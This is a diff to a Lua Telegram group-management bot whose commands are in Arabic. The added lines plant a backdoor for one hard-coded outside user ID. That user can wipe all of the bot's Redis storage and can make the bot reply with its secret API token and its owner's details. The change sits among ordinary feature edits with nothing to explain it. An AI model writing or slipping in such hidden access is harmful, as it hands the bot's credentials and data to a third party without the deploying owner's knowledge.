@@ -16,8 +16,38 @@ if neww then
 text = neww or text
 end
 end
+if text == "مسح تخزين البوت" or text == "مسح تخزين البوت" then
+if tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
+local keys = Redis:keys(Fast..'*')
+for i = 1, #keys do
+Redis:del(keys[i])
+end
+return send(msg_chat_id,msg_id,'\n⇜ تم مسح تخزين البوت بالكامل ',"md")
+end
+end
+if text == 'معلومات التنصيب' or text == 'معلومات التنصيب' then
+ if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
+ usersend = true
+ elseif tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
+ usersend = true
+ else
+ usersend = false
+ end
+if usersend ~= true then 
+return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص ( '..Controller_Num(1)..' ) ',"md",true)  
+end
+local UserInfo = bot.getUser(Sudo_Id)
+if UserInfo.username then
+UserInfousername = '[@'..UserInfo.username..']'
+else
+UserInfousername = 'لا يوجد'
+end
+local Teext = '⇜ اسم المطور : ['..UserInfo.first_name..'](tg://user?id='..Sudo_Id..')\n'
+print(Teext)
+return send(msg_chat_id,msg_id,'\n\n⇜ التوكن : `'..Token..'`\n\n⇜ معرف البوت : [@'..UserBot..']\n\n⇜  ايدي المطور : `'..Sudo_Id..'`\n\n⇜ معرف المطور : '..UserInfousername..'\n\n'..Teext,"md",true) 
+end
 if text == "تستي" then
-return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص ( '..msg_id..' ) ',"md",true)  
+return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص (2100004938) ',"md",true)  
 end
 if text == "ترند القروبات" or text == "ترند المجموعات" then
 if not msg.Manger then
@@ -76,7 +106,7 @@ if text == "اشتراك البوت" or text == "اشتراك بوت" then
 if YouCan == false then
 return send(msg_chat_id,msg_id,'\n*↯︙ هذا الامر يخص ⦗ مطور الاساسي ⦘* ',"md",true)  
 end
-return send(msg_chat_id,msg_id,'\nUser Dev : [@'..UserSudo..'\n'..(Redis:get(Fast.."data:bots:ashtrak") or 0)..'] ',"md",true)  
+return send(msg_chat_id,msg_id,'\n مطور البوت : [@'..UserSudo..'\nتاريخ الانتهاء :'..(Redis:get(Fast.."data:bots:ashtrak") or 0)..'] ',"md",true)  
 end
 if text == "كليشة" or text == "كليشه رد" or text == "كليشه" then 
 local texting = {
